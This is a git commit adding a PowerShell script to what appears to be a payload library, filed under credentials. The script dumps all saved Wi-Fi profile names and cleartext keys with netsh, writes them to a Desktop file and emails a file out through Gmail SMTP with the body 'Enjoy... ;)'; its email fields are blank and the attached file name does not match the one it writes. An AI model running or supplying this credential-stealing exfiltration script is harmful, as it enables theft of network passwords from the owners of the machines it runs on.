37229dd2157fb55dceba99b3e20661048aafc600
Parker Charles Phillips <jeffparkermodhd@gmail.com>
2018-11-13 20:53:46 -0600

    Add files via upload

---
+++ payloads/library/credentials/WifiExtractor/Wi-fi_Credidentials_To_Email.ps1
@@ -0,0 +1,51 @@
+﻿$output = netsh.exe wlan show profiles
+$profileRows = $output | Select-String -Pattern 'All User Profile'
+$profileNames = New-Object System.Collections.ArrayList
+
+for($i = 0; $i -lt $profileRows.Count; $i++){
+    $profileName = ($profileRows[$i] -split ":")[-1].Trim()
+    
+    $profileOutput = netsh.exe wlan show profiles name="$profileName" key=clear
+    
+    $SSIDSearchResult = $profileOutput| Select-String -Pattern 'SSID Name'
+    $profileSSID = ($SSIDSearchResult -split ":")[-1].Trim() -replace '"'
+
+    $passwordSearchResult = $profileOutput| Select-String -Pattern 'Key Content'
+    if($passwordSearchResult){
+        $profilePw = ($passwordSearchResult -split ":")[-1].Trim()
+    } else {
+        $profilePw = ''
+    }
+    
+    $networkObject = New-Object -TypeName psobject -Property @{
+        ProfileName = $profileName
+        SSID = $profileSSID
+        Password = $profilePw
+    }
+    $profileNames.Add($networkObject)
+}
+
+$profileNames | Sort-Object ProfileName | Select-Object ProfileName, SSID, Password | Add-Content $home\Desktop\Wi-fi_Password_Grabber.txt
+
+$Username = "";
+$Password = "";
+$path = "Wi-fi Credidentials To Email.txt";
+
+function Send-ToEmail([string]$email, [string]$attachmentpath){
+
+    $message = new-object Net.Mail.MailMessage;
+    $message.From = "";
+    $message.To.Add($email);
+    $message.Subject = "Wi-fi Extracts";
+    $message.Body = "Enjoy... ;)";
+    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
+    $message.Attachments.Add($attachment);
+
+    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
+    $smtp.EnableSSL = $true;
+    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
+    $smtp.send($message);
+    write-host "Mail Sent" ; 
+    $attachment.Dispose();
+ }
+Send-ToEmail  -email "" -attachmentpath $path;
